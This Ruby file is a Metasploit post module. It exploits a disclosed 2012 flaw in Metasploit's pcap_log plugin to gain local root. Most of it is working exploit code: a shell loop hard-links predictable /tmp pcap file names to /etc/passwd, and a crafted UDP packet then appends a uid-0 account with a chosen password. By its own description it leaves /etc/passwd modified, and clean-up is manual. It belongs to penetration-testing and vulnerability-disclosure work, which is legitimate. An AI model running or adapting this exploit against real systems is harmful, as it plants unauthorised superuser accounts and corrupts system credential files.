##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/local/unix'

load 'lib/msf/core/post/common.rb'
load 'lib/msf/core/post/file.rb'
load 'lib/msf/core/exploit/local/unix.rb'
load 'lib/msf/core/exploit/local/linux.rb'

class Metasploit3 < Msf::Post
	Rank = ExcellentRanking

	include Msf::Post::File
	include Msf::Post::Common

	include Msf::Exploit::Local::Linux
	include Msf::Exploit::Local::Unix

	def initialize(info={})
		super( update_info( info, {
				'Name'	  => 'Metasploit pcap_log Local Privilege Escalation',
				'Description'   => %q{
					Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings,
					creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these
					filenames to /etc/passwd, then sending a packet with a priviliged user entry contained within.
					This, and all the other packets, are appended to /etc/passwd.

					Successful exploitation results in the creation of a new superuser account.

					This module requires manual clean-up - remove /tmp/msf3-session*pcap files and truncate /etc/passwd.
				},
				'License'       => MSF_LICENSE,
				'Author'	=> [ '0a29406d9794e4f9b30b3c5d6702c708'],
				'Platform'      => [ 'linux','unix','bsd' ],
				'SessionTypes'  => [ 'shell', 'meterpreter' ],
				'References'    =>
					[
						[ 'BID', '54472' ],
						[ 'URL', 'http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html'], 
						[ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ],
					],
				'DisclosureDate' => "Jul 16 2012",
				'Targets'       =>
					[
						[ 'Linux/Unix Universal', {} ],
					],
				'DefaultTarget' => 0,
			}
			))
			register_options(
			[	
				Opt::RPORT(2940),
				OptString.new("USERNAME", [ true, "Username for the new superuser", "metasploit" ]),
				OptString.new("PASSWORD", [ true, "Password for the new superuser", "metasploit" ])
			], self)
	end

	def run
		print_status "Waiting for victim"
		initial_size = cmd_exec("cat /etc/passwd | wc -l")
		i = 60
		while(true) do
			if (i == 60)
				# 0a2940: cmd_exec is slow, so send 1 command to do all the links
				cmd_exec("for i in $(seq 0 120); do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
				i = 0
			end
			i = i+1
			if (cmd_exec("cat /etc/passwd | wc -l") != initial_size)
				# PCAP is flowing
				pkt = "\n\n" + datastore['USERNAME'] + ":" + datastore['PASSWORD'].crypt("0a") + ":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"
				print_status("Sending file contents payload to #{session.session_host}")
				udpsock = Rex::Socket::Udp.create(
				{
					'Context' => {'Msf' => framework, 'MsfExploit'=>self}
				})
				udpsock.sendto(pkt, session.session_host, datastore['RPORT'])
				break
			end
			sleep(1)
		end

		if cmd_exec("(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false").include?("true") 
			print_good("Success. You should now be able to login or su to the '" + datastore['USERNAME'] + "' account")
		else
			print_error("Failed. You should manually verify the '" + datastore['USERNAME'] + "' user has not been added")	
		end 
		# 0a2940: Initially the plan was to have this post module switch user, upload & execute a new payload
		#	  However beceause the session is not a terminal, su will not always allow this.		
	end
end